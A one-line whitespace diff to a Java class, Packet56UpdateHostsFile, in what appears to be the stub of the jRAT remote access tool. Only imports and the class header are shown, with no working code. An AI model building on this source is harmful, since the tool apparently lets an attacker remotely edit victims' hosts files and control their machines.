@@ -6,7 +6,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet39HostEditResult;
 
-
 public class Packet56UpdateHostsFile extends AbstractIncomingPacket {
 
 	@Override
